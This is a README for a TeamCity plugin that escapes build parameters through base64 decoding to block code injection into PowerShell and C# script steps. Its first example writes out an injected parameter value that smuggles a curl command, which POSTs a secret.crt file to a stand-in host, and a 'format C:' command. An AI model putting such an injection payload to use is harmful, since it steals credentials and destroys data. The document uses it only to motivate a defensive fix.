## What?
TeamCity plugin to escape build parameters for safe embed into script steps.

## Why?
To prevent people from inserting malicious code into parameters when triggering a build.

**Example 1**: take the following PowerShell script:
```
Write-Host "%MESSAGE_OF_THE_DAY%!"
```
a bad actor with access to build customisation (but not to the build agents) could set `MESSAGE_OF_THE_DAY` to:
```
goodbye >:)"
&curl -d "@secret.crt" -X POST https://badurl.com
&format C:
"
```
(a little contrived, but you get the point!)

Beyond this, an escaped parameter provides a safety net so you don't need to worry about the contents of the original string.
**Example 2**: consider this C# snippet:
```
int seconds = ElapsedTime.TotalSeconds;
Console.WriteLine($"Completed task: %MY_TASK_NAME% in {seconds}s");
```
What if `MY_TASK_NAME` is `MegaTexture{Landscape.tga}`? The script won't even compile.

## How?
![secret_ingredient_is_base64](/images/how.png)

Rather than inserting configuration parameters directly into code, the plugin provides a short snippet in the relevant langauge that decodes a base64 representation of the variable. This way, there's no risk of customised parameters being used as a vector for code injection.

Going back to **Example 1** above, instead of writing this vulnerable script in the PowerShell runner:
```
Write-Host "%MESSAGE_OF_THE_DAY%!"
```
we'd use:
```
$escaped = %ESCAPED_POWERSHELL_MESSAGE_OF_THE_DAY%
Write-Host "$escaped!"
```
which the plugin expands to:
```
$escaped = ([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("bXlfY29vbF92YWx1ZQ==")))
Write-Host "$escaped!"
```
And for the C# in **example 2**, this code:
```
int seconds = ElapsedTime.TotalSeconds;
Console.WriteLine($"Completed task: %MY_TASK_NAME% in {seconds}s");
```
becomes:
```
int seconds = ElapsedTime.TotalSeconds;
string escaped = %ESCAPED_CSHARP_MY_TASK_NAME%
Console.WriteLine($"Completed task: {escaped} in {seconds}s");
```
which the plugin expands to:
```
int seconds = ElapsedTime.TotalSeconds;
string escaped = Encoding.UTF8.GetString(Convert.FromBase64String("TWVnYVRleHR1cmV7TGFuZHNjYXBlLnRnYX0="));
Console.WriteLine($"Completed task: {escaped} in {seconds}s");
```